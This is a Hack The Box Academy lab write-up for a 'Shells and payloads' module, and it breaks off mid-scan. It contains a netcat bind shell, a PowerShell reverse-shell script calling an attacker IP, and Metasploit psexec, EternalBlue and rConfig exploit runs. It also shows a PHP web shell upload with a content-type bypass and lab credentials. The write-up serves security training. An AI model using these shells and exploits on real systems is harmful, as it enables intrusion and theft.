# Shells and payloads
* Source: [Hack the Box: Academy](https://academy.hackthebox.com/)
* Module: Shells and payloads
* Tier: I
* Difficulty: Medium
* Category: Offensive
* Time estimate: 2 days
* Date: 02-01-2023
* Author: [DjikstraCS](https://github.com/DjikstraCS)

---
## Anatomy of a Shell
### Question 1:
![](./attachments/Pasted%20image%2020230130115450.png)

![](./attachments/Pasted%20image%2020230130115526.png)

**Answer:** `bash&powershell`

### Question 2:
![](./attachments/Pasted%20image%2020230130115427.png)

![](./attachments/Pasted%20image%2020230130115955.png)

**Answer:** `Core`

---
## Bind Shells
### Question 1:
![](./attachments/Pasted%20image%2020230130121341.png)
*Hint: Read the question carefully and consider how establishing a shell session works.*

Easy.

**Answer:** `443`

### Question 2:
![](./attachments/Pasted%20image%2020230130121351.png)
*Hint You will want to connect to the target over ssh first.*

Server:

```
┌──(kali㉿kali)-[~]
└─$ sudo ssh htb-student@10.129.201.134
[sudo] password for kali: 
The authenticity of host '10.129.201.134 (10.129.201.134)' can't be established.
ED25519 key fingerprint is SHA256:HfXWue9Dnk+UvRXP6ytrRnXKIRSijm058/zFrj/1LvY.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.201.134' (ED25519) to the list of known hosts.
htb-student@10.129.201.134's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-88-generic x86_64)

(...)

htb-student@ubuntu:~$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.201.134 7777 > /tmp/f
```

Client (kali):

```
┌──(kali㉿kali)-[~/HTB/FileTransfers/winFileTransferMethods]
└─$ nc -nv 10.129.201.134 7777
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Connected to 10.129.201.134:7777.
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

htb-student@ubuntu:~$ cat /customscripts/flag.txt
cat /customscripts/flag.txt
B1nD_Shells_r_cool
```

**Answer:** `B1nD_Shells_r_cool`

---
## 
### Question 1:
![](./attachments/Pasted%20image%2020230130123501.png)

**Answer:** `Client`

### Question 2:
![](./attachments/Pasted%20image%2020230130123509.png)
*Hint: ###### use this string to connect with xfreerdp to the host : xfreerdp /v: "target IP address" /u:htb-student /p:HTB_@cademy_stdnt!*

The script given by HTB contains errors, so we asked ChatGPT to correct them:

![](./attachments/Pasted%20image%2020230130125627.png)

The corrected script:

```
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
    $sendback = iex $data 2>&1 | Out-String
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}
$client.Close()
```

![](./attachments/Pasted%20image%2020230130125702.png)

```
┌──(kali㉿kali)-[~]
└─$ sudo nc -lvnp 443                  
[sudo] password for kali: 
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.129.201.51.
Ncat: Connection from 10.129.201.51:60452.
PS C:\Windows\system32> hostname
Shells-Win10
```

**Answer:** `Shells-Win10`

---
## Automating Payloads & Delivery with Metasploit
### Question 1:
![](./attachments/Pasted%20image%2020230131200208.png)
*Hint: Pay close attention to what happens when we run the exploit*

```
msf6 exploit(windows/smb/psexec) > exploit

[*] Started reverse TCP handler on 10.10.14.222:4444 
[*] 10.129.180.71:445 - Connecting to the server...
[*] 10.129.180.71:445 - Authenticating to 10.129.180.71:445 as user 'htb-student'...
[*] 10.129.180.71:445 - Selecting PowerShell target
[*] 10.129.180.71:445 - Executing the payload...
[+] 10.129.180.71:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (175174 bytes) to 10.129.180.71
[*] Meterpreter session 1 opened (10.10.14.222:4444 -> 10.129.180.71:49675) at 2021-09-13 17:43:41 +0000

meterpreter > 
```

**Answer:** `PowerShell`


### Question 2:
![](./attachments/Pasted%20image%2020230131200216.png)
*Hint: Use htb-student to connect....*

```
┌──(kali㉿kali)-[~]
└─$ sudo msfconsole                                   
[sudo] password for kali: 
                                                  
  +-------------------------------------------------------+
  |  METASPLOIT by Rapid7                                 |                                                                                                                                                                                 
  +---------------------------+---------------------------+                                                                                                                                                                                 
  |      __________________   |                           |                                                                                                                                                                                 
  |  ==c(______(o(______(_()  | |""""""""""""|======[***  |                                                                                                                                                                                 
  |             )=\           | |  EXPLOIT   \            |                                                                                                                                                                                 
  |            // \\          | |_____________\_______    |                                                                                                                                                                                 
  |           //   \\         | |==[msf >]============\   |                                                                                                                                                                                 
  |          //     \\        | |______________________\  |                                                                                                                                                                                 
  |         // RECON \\       | \(@)(@)(@)(@)(@)(@)(@)/   |                                                                                                                                                                                 
  |        //         \\      |  *********************    |                                                                                                                                                                                 
  +---------------------------+---------------------------+                                                                                                                                                                                 
  |      o O o                |        \'\/\/\/'/         |                                                                                                                                                                                 
  |              o O          |         )======(          |                                                                                                                                                                                 
  |                 o         |       .'  LOOT  '.        |                                                                                                                                                                                 
  | |^^^^^^^^^^^^^^|l___      |      /    _||__   \       |                                                                                                                                                                                 
  | |    PAYLOAD     |""\___, |     /    (_||_     \      |                                                                                                                                                                                 
  | |________________|__|)__| |    |     __||_)     |     |                                                                                                                                                                                 
  | |(@)(@)"""**|(@)(@)**|(@) |    "       ||       "     |                                                                                                                                                                                 
  |  = = = = = = = = = = = =  |     '--------------'      |                                                                                                                                                                                 
  +---------------------------+---------------------------+                                                                                                                                                                                 


       =[ metasploit v6.2.23-dev                          ]
+ -- --=[ 2259 exploits - 1188 auxiliary - 402 post       ]
+ -- --=[ 951 payloads - 45 encoders - 11 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: View missing module options with show 
missing                                                                                                                                                                                                                                     
Metasploit Documentation: https://docs.metasploit.com/

msf6 > smb
[-] Unknown command: smb
msf6 > search smb

Matching Modules
================

   #    Name                                                               Disclosure Date  Rank       Check  Description
   -    ----                                                               ---------------  ----       -----  -----------
   0    exploit/multi/http/struts_code_exec_classloader                    2014-03-06       manual     No     Apache Struts ClassLoader Manipulation Remote Code Execution
   1    exploit/osx/browser/safari_file_policy                             2011-10-12       normal     No     Apple Safari file:// Arbitrary Code Execution
   2    auxiliary/server/capture/smb                                                        normal     No     Authentication Capture: SMB

(...)

   57   exploit/windows/smb/psexec                                         1999-01-01       manual     No     Microsoft Windows Authenticated User Code Execution



Interact with a module by name or index. For example info 136, use 136 or use payload/windows/custom/reverse_named_pipe

msf6 > use 57
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/smb/psexec) > options

Module options (exploit/windows/smb/psexec):

   Name                  Current Setting  Required  Description
   ----                  ---------------  --------  -----------
   RHOSTS                                 yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT                 445              yes       The SMB service port (TCP)
   SERVICE_DESCRIPTION                    no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                   no        The service display name
   SERVICE_NAME                           no        The service name
   SMBDomain             .                no        The Windows domain to use for authentication
   SMBPass                                no        The password for the specified username
   SMBSHARE                               no        The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share
   SMBUser                                no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.0.2.15        yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf6 exploit(windows/smb/psexec) > set SHARE ADMIN$
SHARE => ADMIN$
msf6 exploit(windows/smb/psexec) > set SMBUser htb-student
SMBUser => htb-student
msf6 exploit(windows/smb/psexec) > set SMBPass HTB_@cademy_stdnt!
SMBPass => HTB_@cademy_stdnt!
msf6 exploit(windows/smb/psexec) > set RHOST 10.129.237.181
RHOST => 10.129.237.181
msf6 exploit(windows/smb/psexec) > set LHOST 10.10.15.92
LHOST => 10.10.15.92
msf6 exploit(windows/smb/psexec) > run

[*] Started reverse TCP handler on 10.10.15.92:4444 
[*] 10.129.237.181:445 - Connecting to the server...
[*] 10.129.237.181:445 - Authenticating to 10.129.237.181:445 as user 'htb-student'...
[*] 10.129.237.181:445 - Selecting PowerShell target
[*] 10.129.237.181:445 - Executing the payload...
[+] 10.129.237.181:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (175686 bytes) to 10.129.237.181
[*] Meterpreter session 1 opened (10.10.15.92:4444 -> 10.129.237.181:49974) at 2023-01-31 14:14:03 -0500

meterpreter > shell
Process 3348 created.
Channel 1 created.
Microsoft Windows [Version 10.0.18363.1854]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Windows\system32>dir \Users\htb-student\Documents
Volume in drive C has no label.
 Volume Serial Number is C41A-F2ED

 Directory of C:\Users\htb-student\Documents

10/16/2021  12:17 PM    <DIR>          .
10/16/2021  12:17 PM    <DIR>          ..
10/16/2021  12:16 PM               268 staffsalaries.txt
               1 File(s)            268 bytes
               2 Dir(s)  11,700,649,984 bytes free
```

**Answer:** `staffsalaries.txt`

---
## Infiltrating Windows
### Question 1:
![](./attachments/Pasted%20image%2020230201100544.png)
*Hint: This filetype is often used to complete a BATCH of tasks.*

**Answer:** `.bat`

### Question 2:
![](./attachments/Pasted%20image%2020230201100552.png)
*Hint: This exploit made many admin Blue..*

**Answer:** `MS17-010`

### Question 3:
![](./attachments/Pasted%20image%2020230201100600.png)

```
┌──(kali㉿kali)-[~/HTB/ShellsAndPayloads/InfiltratingWindows]
└─$ nmap -n -sV -sC -oA nmap_sV_sC_top1000_scan 10.129.201.97       
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-01 04:16 EST
Nmap scan report for 10.129.201.97
Host is up (0.063s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT    STATE SERVICE      VERSION
80/tcp  open  http         Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: 10.129.201.97 - /
|_http-server-header: Microsoft-IIS/10.0
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2023-02-01T09:17:00
|_  start_date: 2023-02-01T09:15:17
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: SHELLS-WINBLUE
|   NetBIOS computer name: SHELLS-WINBLUE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-02-01T01:16:56-08:00
|_clock-skew: mean: 2h40m00s, deviation: 4h37m08s, median: 0s
```

```
┌──(kali㉿kali)-[~]
└─$ sudo msfconsole
[sudo] password for kali: 

(...)

msf6 > search eternal

Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution


Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/smb/smb_doublepulsar_rce

msf6 exploit(windows/smb/ms17_010_eternalblue) > use 1
[*] Using configured payload windows/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_psexec) > options

Module options (exploit/windows/smb/ms17_010_psexec):

   Name                  Current Setting                                Required  Description
   ----                  ---------------                                --------  -----------
   DBGTRACE              false                                          yes       Show extra debug trace info
   LEAKATTEMPTS          99                                             yes       How many times to try to leak transaction
   NAMEDPIPE                                                            no        A named pipe that can be connected to (leave blank for auto)
   NAMED_PIPES           /usr/share/metasploit-framework/data/wordlist  yes       List of named pipes to check
                         s/named_pipes.txt
   RHOSTS                10.129.201.97                                  yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-
                                                                                  Metasploit
   RPORT                 445                                            yes       The Target port (TCP)
   SERVICE_DESCRIPTION                                                  no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                                                 no        The service display name
   SERVICE_NAME                                                         no        The service name
   SHARE                 ADMIN$                                         yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/wr
                                                                                  ite folder share
   SMBDomain             .                                              no        The Windows domain to use for authentication
   SMBPass                                                              no        The password for the specified username
   SMBUser                                                              no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.15.92      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf6 exploit(windows/smb/ms17_010_psexec) > run

[*] Started reverse TCP handler on 10.10.15.92:4444 
[*] 10.129.201.97:445 - Target OS: Windows Server 2016 Standard 14393
[*] 10.129.201.97:445 - Built a write-what-where primitive...
[+] 10.129.201.97:445 - Overwrite complete... SYSTEM session obtained!
[*] 10.129.201.97:445 - Selecting PowerShell target
[*] 10.129.201.97:445 - Executing the payload...
[+] 10.129.201.97:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (175686 bytes) to 10.129.201.97
[*] Meterpreter session 1 opened (10.10.15.92:4444 -> 10.129.201.97:49673) at 2023-02-01 04:30:54 -0500

meterpreter > shell
Process 684 created.
Channel 1 created.
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>type \flag.txt
type \flag.txt
EB-Still-W0rk$
```

**Answer:** `EB-Still-W0rk$`

---
## Infiltrating Unix/Linux
### Question 1:
![](./attachments/Pasted%20image%2020230201105410.png)
*Hint: Pay careful attention to what happens when the exploit is run.*

```
msf6 exploit(linux/http/rconfig_vendors_auth_file_upload_rce) > exploit

[*] Started reverse TCP handler on 10.10.14.111:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] 3.9.6 of rConfig found !
[+] The target appears to be vulnerable. Vulnerable version of rConfig found !
[+] We successfully logged in !
[*] Uploading file 'olxapybdo.php' containing the payload...
[*] Triggering the payload ...
[*] Sending stage (39282 bytes) to 10.129.201.101
[+] Deleted olxapybdo.php
[*] Meterpreter session 1 opened (10.10.14.111:4444 -> 10.129.201.101:38860) at 2021-09-27 13:49:34 -0400

meterpreter > dir
Listing: /home/rconfig/www/images/vendor
========================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100644/rw-r--r--  673   fil   2020-09-03 05:49:58 -0400  ajax-loader.gif
100644/rw-r--r--  1027  fil   2020-09-03 05:49:58 -0400  cisco.jpg
100644/rw-r--r--  1017  fil   2020-09-03 05:49:58 -0400  juniper.jpg
```

**Answer:** `PHP`

 
### Question 2:
![](./attachments/Pasted%20image%2020230201105417.png)

```
┌──(kali㉿kali)-[~/HTB/ShellsAndPayloads/InfiltratingLinux]
└─$ sudo nmap -n -sV -sC -oA nmap_sV_sC_top1000_scan 10.129.201.101
[sudo] password for kali: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-01 04:57 EST
Nmap scan report for 10.129.201.101
Host is up (0.033s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      vsftpd 2.0.8 or later
22/tcp   open  ssh      OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 2db223758757b9d2dc88b9f4c19e362a (RSA)
|   256 c48820b0222b66d08e9d2fe5dd3271b1 (ECDSA)
|_  256 e32aecf0e412fcdacf76d54317302327 (ED25519)
80/tcp   open  http     Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.2.34)
|_http-title: Did not follow redirect to https://10.129.201.101/
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.2.34
111/tcp  open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|_  100000  3,4          111/udp6  rpcbind
443/tcp  open  ssl/http Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.2.34)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2021-09-24T19:29:26
|_Not valid after:  2022-09-24T19:29:26
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.2.34
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
3306/tcp open  mysql    MySQL (unauthorized)
Service Info: Host: the

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.96 seconds
```

```
msf6 > search rconfig

Matching Modules
================

   #  Name                                                     Disclosure Date  Rank       Check  Description
   -  ----                                                     ---------------  ----       -----  -----------
   0  exploit/multi/http/solr_velocity_rce                     2019-10-29       excellent  Yes    Apache Solr Remote Code Execution via Velocity Template
   1  auxiliary/gather/nuuo_cms_file_download                  2018-10-11       normal     No     Nuuo Central Management Server Authenticated Arbitrary File Download
   2  exploit/linux/http/rconfig_ajaxarchivefiles_rce          2020-03-11       good       Yes    Rconfig 3.x Chained Remote Code Execution
   3  exploit/linux/http/rconfig_vendors_auth_file_upload_rce  2021-03-17       excellent  Yes    rConfig Vendors Auth File Upload RCE
   4  exploit/unix/webapp/rconfig_install_cmd_exec             2019-10-28       excellent  Yes    rConfig install Command Execution


Interact with a module by name or index. For example info 4, use 4 or use exploit/unix/webapp/rconfig_install_cmd_exec

msf6 exploit(windows/smb/ms17_010_psexec) > use 3
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf6 exploit(linux/http/rconfig_vendors_auth_file_upload_rce) > options

Module options (exploit/linux/http/rconfig_vendors_auth_file_upload_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD   admin            yes       Password of the admin account
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT      443              yes       The target port (TCP)
   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all
                                         addresses.
   SRVPORT    8080             yes       The local port to listen on.
   SSL        true             no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       The base path of the rConfig server
   URIPATH                     no        The URI to use for this exploit (default is random)
   USERNAME   admin            yes       Username of the admin account
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.0.2.15        yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   rConfig <= 3.9.6


msf6 exploit(linux/http/rconfig_vendors_auth_file_upload_rce) > set RHOST 10.129.201.101
RHOST => 10.129.201.101
msf6 exploit(linux/http/rconfig_vendors_auth_file_upload_rce) > set LHOST 10.10.15.92
LHOST => 10.10.15.92
msf6 exploit(linux/http/rconfig_vendors_auth_file_upload_rce) > run

[*] Started reverse TCP handler on 10.10.15.92:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] 3.9.6 of rConfig found !
[+] The target appears to be vulnerable. Vulnerable version of rConfig found !
[+] We successfully logged in !
[*] Uploading file 'sobeoeuhfw.php' containing the payload...
[*] Triggering the payload ...
[*] Sending stage (39927 bytes) to 10.129.201.101
[+] Deleted sobeoeuhfw.php
[*] Meterpreter session 2 opened (10.10.15.92:4444 -> 10.129.201.101:34912) at 2023-02-01 05:00:01 -0500

meterpreter > shell
Process 2523 created.
Channel 0 created.
python -c 'import pty; pty.spawn("/bin/sh")'
sh-4.2$ pwd
pwd
/home/rconfig/www/images/vendor
sh-4.2$ ls /
ls /
bin   dev            etc   lib    media  opt   root  sbin  sys  usr
boot  devicedetails  home  lib64  mnt    proc  run   srv   tmp  var
sh-4.2$ cd /devicedetails   
cd /devicedetails
sh-4.2$ ls
edgerouter-isp.yml  hostnameinfo.txt
```


**Answer:** `edgerouter-isp`

---
## Laudanum, One Webshell To Rule Them All
### Question 1:
![](./attachments/Pasted%20image%2020230201112819.png)
*Hint: This would be the absolute path to the directory where the web shell file is stored. Try looking in /usr/share/webshells*

![](./attachments/Pasted%20image%2020230201112921.png)

**Answer:** `/usr/share/webshells/laudanum/aspx/shell.aspx`


### Question 2:
![](./attachments/Pasted%20image%2020230201112826.png)
*Hint: Closely follow the steps covered in this section. Use the dir command to see the directory.*

Find the Laundanum shell

```
┌──(kali㉿kali)-[~/HTB/ShellsAndPayloads/InfiltratingLinux]
└─$ locate laudanum
(...)
/usr/share/laudanum/aspx/shell.aspx
```

Edit the shell to include local host IP (Kali VPN).

![](./attachments/Pasted%20image%2020230201114153.png)

Upload the script and note the path.

![](./attachments/Pasted%20image%2020230201114220.png)

Access the page using backslashes: `status.inlanefreight.local\\files\lauda.aspx`

![](./attachments/Pasted%20image%2020230201114345.png)

The dir we land in is: `c:\windows\system32\inetsrv`

**Answer:** `c:\windows\system32\inetsrv`

---
## Antak Webshell
### Question 1:
![](./attachments/Pasted%20image%2020230201115904.png)
*Hint: Try using the locate command.*

![](./attachments/Pasted%20image%2020230201115929.png)

**Answer:** `/usr/share/nishang/Antak-WebShell/antak.aspx`


### Question 2:
![](./attachments/Pasted%20image%2020230201115913.png)
*Hint: whoami is a meaningful question....*

Much like the previous question, but instead of editing the shell inserting our IP address, here we need to set a username and password to prevent random people from SKaldiscovering and using the shell.

![](./attachments/Pasted%20image%2020230201121236.png)

**Answer:** `iis apppool\status`

---
## PHP Web Shells
### Question 1:
![](./attachments/Pasted%20image%2020230201185509.png)

The answer is found in the text section of the module section.

**Answer:** `image/gif`

### Question 2:
![](./attachments/Pasted%20image%2020230201185516.png)

Download the webshell: 

```
┌──(kali㉿kali)-[~/HTB/ShellsAndPayloads/PHPwebShells]
└─$ wget https://raw.githubusercontent.com/WhiteWinterWolf/wwwolf-php-webshell/master/webshell.php
--2023-02-01 13:41:22--  https://raw.githubusercontent.com/WhiteWinterWolf/wwwolf-php-webshell/master/webshell.php
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.111.133, 185.199.109.133, 185.199.108.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.111.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 7205 (7.0K) [text/plain]
Saving to: ‘webshell.php’

webshell.php               100%[======================================>]   7.04K  --.-KB/s    in 0.06s   

2023-02-01 13:41:23 (122 KB/s) - ‘webshell.php’ saved [7205/7205]
```

Launch Burp suite and it's build-in browser, navigate to the web-page and login in as  `admin:admin`. Then go to the Vendor section under Devices, here we can upload a file if we click on 'Add Vendor'.

![](./attachments/Pasted%20image%2020230201201414.png)

Turn interception on in Burp suite and upload the `webshell.php` file by clicking 'Save' after selecting the file.

![](./attachments/Pasted%20image%2020230201201620.png)

Change the content-type from `application/x-php` to `image/gif` and forward the request.

![](./attachments/Pasted%20image%2020230201201745.png)

If successful, we should see a new vendor. The link to the image is the URL of our shell.

![](./attachments/Pasted%20image%2020230201201855.png)

**Answer:** `ajax-loader.gif`

---
## The Live Engagement
### Question 1:
![](./attachments/Pasted%20image%2020230201205152.png)
*Hint: Where can the hostname be found? If on host, how can you ask for it?*

```
─[htb-student@skills-foothold]─[~]
└──╼ $sudo nmap -n -sV -sC 172.16.1.11
[sudo] password for htb-student: 
Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-01 14:50 EST
Nmap scan report for 172.16.1.11
Host is up (0.074s latency).
Not shown: 989 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: Inlanefreight
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Windows Server 2019 Standard 17763 microsoft-ds
515/tcp  open  printer       Microsoft lpd
1801/tcp open  msmq?
2103/tcp open  msrpc         Microsoft Windows RPC
2105/tcp open  msrpc         Microsoft Windows RPC
2107/tcp open  msrpc         Microsoft Windows RPC
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: SHELLS-WINSVR
|   NetBIOS_Domain_Name: SHELLS-WINSVR
|   NetBIOS_Computer_Name: SHELLS-WINSVR
|   DNS_Domain_Name: shells-winsvr
|   DNS_Computer_Name: shells-winsvr
|   Product_Version: 10.0.17763
|_  System_Time: 2023-02-01T19:51:00+00:00
| ssl-cert: Subject: commonName=shells-winsvr
| Not valid before: 2023-01-31T19:28:34
|_Not valid after:  2023-08-02T19:28:34
|_ssl-date: 2023-02-01T19:51:05+00:00; -1s from scanner time.
8080/tcp open  http          Apache Tomcat 10.0.11
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Apache Tomcat/10.0.11
|_http-favicon: Apache Tomcat
MAC Address: 00:50:56:B9:96:16 (VMware)
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
|   Computer name: shells-winsvr
|   NetBIOS computer name: SHELLS-WINSVR\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-02-01T11:51:00-08:00
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2023-02-01T19:51:00
|_  start_date: N/A
|_clock-skew: mean: 1h35m58s, deviation: 3h34m39s, median: -1s
|_nbstat: NetBIOS name: SHELLS-WINSVR, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:96:16 (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 61.15 seconds
```

**Answer:** `shells-winsvr`

### Question 2:
![](./attachments/Pasted%20image%2020230201205240.png)
*Hint: This host seems to allow war files to be uploaded. Maybe a certain kind of payload could be crafted....*

```
┌─[htb-student@skills-foothold]─[~]
└──╼ $sudo nmap -n -sV -sC 172.16.1.11
Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-02 04:54 EST
Nmap scan report for 172.16.1.11
Host is up (0.11s latency).
Not shown: 989 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: Inlanefreight
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Windows Server 2019 Standard 17763 microsoft-ds
515/tcp  open  printer       Microsoft lpd
1801/tcp open  msmq?
2103/tcp open  msrpc         Microsoft Windows RPC
2105/tcp open  msrpc         Microsoft Windows RPC
2107/tcp open  msrpc         Microsoft Windows RPC
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: SHELLS-WINSVR
|   NetBIOS_Domain_Name: SHELLS-WINSVR
|   NetBIOS_Computer_Name: SHELLS-WINSVR
|   DNS_Domain_Name: shells-winsvr
|   DNS_Computer_Name: shells-winsvr
|   Product_Version: 10.0.17763
|_  System_Time: 2023-02-02T09:55:37+00:00
|_ssl-date: 2023-02-02T09:55:43+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=shells-winsvr
| Not valid before: 2023-02-01T09:10:26
|_Not valid after:  2023-08-03T09:10:26
8080/tcp open  http          Apache Tomcat 10.0.11
|_http-title: Apache Tomcat/10.0.11
|_http-open-proxy: Proxy might be redirecting requests
|_http-favicon: Apache Tomcat
MAC Address: 00:50:56:B9:AC:D8 (VMware)
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-02-02T09:55:37
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
|   Computer name: shells-winsvr
